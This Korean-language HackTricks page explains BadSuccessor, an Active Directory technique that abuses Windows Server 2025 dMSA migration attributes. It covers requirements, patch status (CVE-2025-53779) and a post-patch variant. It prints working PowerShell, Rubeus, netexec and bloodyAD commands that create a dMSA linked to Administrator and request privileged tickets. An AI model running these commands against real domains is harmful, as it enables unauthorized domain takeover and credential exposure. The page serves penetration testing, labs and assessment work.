# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## 개요

**BadSuccessor**는 **Windows Server 2025**에 도입된 **delegated Managed Service Account**(**dMSA**) 마이그레이션 워크플로를 악용합니다. dMSA는 **`msDS-ManagedAccountPrecededByLink`**를 통해 기존 계정에 연결할 수 있으며, **`msDS-DelegatedMSAState`**에 저장된 마이그레이션 상태를 거쳐 이동할 수 있습니다. 공격자가 쓰기 가능한 OU에 dMSA를 만들고 해당 속성을 제어할 수 있다면, KDC는 **연결된 계정의 권한 컨텍스트로** 공격자가 제어하는 dMSA에 대한 티켓을 발급할 수 있습니다.<sup>[[2]](#references)</sup>

실제로 이는 OU 권한을 위임받은 권한이 낮은 사용자가 새 dMSA를 만들고, 이를 `Administrator`에 연결한 뒤 마이그레이션 상태를 완료하여 PAC에 **Domain Admins** 같은 권한 그룹이 포함된 TGT를 얻을 수 있다는 뜻입니다.<sup>[[2]](#references)</sup>

## 중요한 dMSA 마이그레이션 세부 정보

- dMSA는 **Windows Server 2025** 기능입니다.
- `Start-ADServiceAccountMigration`은 마이그레이션 상태를 **started**로 설정합니다.
- `Complete-ADServiceAccountMigration`은 마이그레이션 상태를 **completed**로 설정합니다.
- `msDS-DelegatedMSAState = 1`은 마이그레이션이 시작되었음을 의미합니다.
- `msDS-DelegatedMSAState = 2`는 마이그레이션이 완료되었음을 의미합니다.
- 정상적인 마이그레이션에서는 dMSA가 대체되는 계정을 투명하게 대신하도록 설계되어 있으므로, KDC/LSA는 이전 계정이 이미 보유하고 있던 액세스를 유지합니다.<sup>[[3]](#references)</sup>

Microsoft Learn에서도 마이그레이션 중 원래 계정이 dMSA에 연결되며 dMSA가 이전 계정이 액세스할 수 있었던 리소스에 액세스하도록 설계되었다고 설명합니다.<sup>[[3]](#references)</sup> 이것이 BadSuccessor가 악용하는 보안 가정입니다.<sup>[[2]](#references)</sup>

## 요구 사항

1. **dMSA가 존재하는** 도메인. 즉, AD 측에서 **Windows Server 2025**를 지원해야 합니다.
2. 공격자가 일부 OU에서 `msDS-DelegatedManagedServiceAccount` 개체를 **만들 수 있거나**, 해당 OU의 하위 개체를 만들 수 있는 동등한 광범위한 권한이 있어야 합니다.
3. 공격자가 관련 dMSA 속성을 **쓸 수 있거나**, 자신이 만든 dMSA를 완전히 제어할 수 있어야 합니다.
4. 공격자가 도메인에 가입된 컨텍스트에서 또는 LDAP/Kerberos에 연결되는 터널을 통해 Kerberos 티켓을 요청할 수 있어야 합니다.<sup>[[2]](#references)</sup>

### 실무 점검

가장 명확한 운영상 신호는 도메인/포리스트 수준을 확인하고 환경에서 이미 새로운 Server 2025 스택을 사용 중인지 검증하는 것입니다:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

`Windows2025Domain` 및 `Windows2025Forest`와 같은 값을 발견하면 **BadSuccessor / dMSA migration abuse**를 우선 점검하세요.

공개 도구를 사용해 dMSA 생성 권한이 위임된 쓰기 가능한 OU도 열거할 수 있습니다:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## 악용 흐름

1. 자식 개체 생성 권한을 위임받은 OU에 dMSA를 만듭니다.
2. **`msDS-ManagedAccountPrecededByLink`**를 `CN=Administrator,CN=Users,DC=corp,DC=local`과 같은 권한이 높은 대상의 DN으로 설정합니다.
3. 마이그레이션이 완료된 것으로 표시하려면 **`msDS-DelegatedMSAState`**를 `2`로 설정합니다.
4. 새 dMSA에 대한 TGT를 요청하고, 반환된 티켓으로 권한이 높은 서비스에 액세스합니다.<sup>[[2]](#references)</sup>

PowerShell 예시:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

티켓 요청 / 운영 도구 예시:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## 이것이 단순한 권한 상승 이상인 이유

정상적인 마이그레이션 중에는 cutover 전에 이전 계정에 발급된 티켓도 새 dMSA가 처리할 수 있어야 합니다. 따라서 dMSA 관련 티켓 자료에는 **`KERB-DMSA-KEY-PACKAGE`** 흐름에서 **현재** 키와 **이전** 키가 포함될 수 있습니다.<sup>[[2]](#references)</sup>

공격자가 제어하는 가짜 마이그레이션에서는 이 동작으로 인해 BadSuccessor가 다음과 같은 결과를 초래할 수 있습니다.<sup>[[2]](#references)</sup>

- PAC에서 권한이 높은 그룹 SID를 상속하여 **권한 상승**.
- 이전 키 처리로 인해 취약한 워크플로에서 이전 계정의 RC4/NT 해시와 동등한 자료가 노출될 수 있으므로 **credential 자료 노출**.

따라서 이 기법은 도메인 직접 장악뿐 아니라 pass-the-hash나 더 광범위한 credential 침해와 같은 후속 작업에도 유용합니다.

## KDC 패치 이후의 BetterSuccessor

패치된 KDC는 dMSA 마이그레이션의 양쪽을 모두 검증합니다. dMSA의 `msDS-ManagedAccountPrecededByLink` 및 마이그레이션 상태 외에도, 이전 계정이 `msDS-SupersededManagedAccountLink`를 통해 dMSA를 다시 가리키고 호환되는 `msDS-SupersededServiceAccountState`를 가져야 합니다. 이제 단방향 링크는 실패하며, dMSA만 만들 수 있는 계정은 임의의 이전 계정을 지정할 수 없습니다. OU에서 dMSA에 대한 `CreateChild` 권한 **및** 선택한 대상 계정의 마이그레이션 속성에 대한 실효성 있는 쓰기 권한이 있으면 공격자는 상호 링크를 설정할 수 있습니다. 이렇게 생성된 dMSA 티켓에는 이전 계정의 권한 컨텍스트가 포함될 수 있으며, dMSA 키 패키지에서 해당 계정의 키가 노출될 수 있습니다. 이는 대상 계정에 대한 credential 접근 및 권한 증폭 경로이지, 패치된 DC에서 기존의 임의 대상 BadSuccessor가 여전히 악용 가능하다는 증거는 아닙니다.<sup>[[5]](#references)[[6]](#references)</sup>

대상 계정에 대한 쓰기 권한이 확인된 lab 환경에서는 `bloodyAD`를 사용해 dMSA를 만들고 쌍을 이루는 마이그레이션 쓰기 작업을 수행할 수 있습니다. 반환된 Kerberos 자료로 dMSA 티켓을 요청하고, 해당 계정의 권한이나 해시를 복구했다고 단정하기 전에 대상 계정의 실제 권한을 확인하세요. 도구의 `badSuccessor` 하위 명령 이름이 패치 전의 단방향 동작을 의미하는 것은 아닙니다.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## 패치 상태 관련 참고 사항

원래의 BadSuccessor 동작은 **단순히 2025년 프리뷰에서만 나타나는 이론적인 문제가 아닙니다**. Microsoft는 이 취약점에 **CVE-2025-53779**를 부여하고 **2025년 8월** 보안 업데이트를 공개했습니다.<sup>[[4]](#references)</sup> 다음 상황을 위해 이 공격을 문서화해 두세요.

- **labs / CTFs / assume-breach 연습**
- **패치되지 않은 Windows Server 2025 환경**
- **평가 중 OU 위임 및 dMSA 노출 검증**

dMSA가 있다는 이유만으로 Windows Server 2025 도메인이 취약하다고 단정하지 마세요. 패치 수준을 확인하고 신중하게 테스트하세요.

## 도구

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA 악용으로 Domain Admin 권한 획득 (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Active Directory에서 권한 상승을 위해 dMSA 악용하기](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts 개요](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor는 죽었다, BadSuccessor여 영원하라(?) ](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: 패치 이후에도 dMSA 악용하기](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
